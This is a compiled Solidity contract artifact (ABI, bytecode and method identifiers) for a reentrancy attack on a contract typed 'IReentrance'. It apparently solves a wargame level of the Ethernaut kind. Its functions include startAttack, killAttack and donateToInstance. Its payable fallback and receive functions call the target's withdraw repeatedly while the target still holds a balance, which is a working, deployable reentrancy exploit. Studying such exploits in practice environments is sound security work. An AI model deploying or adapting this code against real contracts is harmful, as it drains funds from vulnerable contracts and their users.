{"abi":[{"type":"constructor","inputs":[{"name":"_instance","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"fallback","stateMutability":"payable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"donateToInstance","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"getBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"instance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IReentrance"}],"stateMutability":"view"},{"type":"function","name":"killAttack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"startAttack","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561001057600080fd5b506040516105363803806105368339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b03199092169190911790556104d1806100656000396000f3fe60806040526004361061005e5760003560e01c806348e1d4b41161004357806348e1d4b41461018a57806367ffb7ab1461019f57806377c00de0146101a7576100d8565b8063022ec0951461013257806312065fe014610163576100d8565b366100d8576000546001600160a01b031631156100d6576000805460408051632e1a7d4d60e01b81526001600482015290516001600160a01b0390921692632e1a7d4d9260248084019382900301818387803b1580156100bd57600080fd5b505af11580156100d1573d6000803e3d6000fd5b505050505b005b6000546001600160a01b031631156100d6576000805460408051632e1a7d4d60e01b81526001600482015290516001600160a01b0390921692632e1a7d4d9260248084019382900301818387803b1580156100bd57600080fd5b34801561013e57600080fd5b506101476101bc565b604080516001600160a01b039092168252519081900360200190f35b34801561016f57600080fd5b506101786101cb565b60408051918252519081900360200190f35b34801561019657600080fd5b506100d66101cf565b6100d6610227565b3480156101b357600080fd5b506100d661039f565b6000546001600160a01b031681565b4790565b604051600090339047908381818185875af1925050503d8060008114610211576040519150601f19603f3d011682016040523d82523d6000602084013e610216565b606091505b505090508061022457600080fd5b50565b60008054604080513360248083019190915282518083039091018152604490910182526020810180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167e362a9500000000000000000000000000000000000000000000000000000000178152915181516001600160a01b0390941693349382918083835b602083106102c85780518252601f1990920191602091820191016102a9565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d806000811461032a576040519150601f19603f3d011682016040523d82523d6000602084013e61032f565b606091505b505090508061022457604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600d60248201527f446f6e617465206661696c656400000000000000000000000000000000000000604482015290519081900360640190fd5b60008054604080517f70a0823100000000000000000000000000000000000000000000000000000000815230600482015290516001600160a01b03909216916370a0823191602480820192602092909190829003018186803b15801561040457600080fd5b505afa158015610418573d6000803e3d6000fd5b505050506040513d602081101561042e57600080fd5b505190508015610224576000805460408051632e1a7d4d60e01b81526004810185905290516001600160a01b0390921692632e1a7d4d9260248084019382900301818387803b15801561048057600080fd5b505af1158015610494573d6000803e3d6000fd5b505050505056fea2646970667358221220398d5ca7a5f86c29d1211f03fa8694d3ac6509def23e315b65cffaaeb088d3b764736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"donateToInstance()":"67ffb7ab","getBalance()":"12065fe0","instance()":"022ec095","killAttack()":"48e1d4b4","startAttack()":"77c00de0"},"id":0}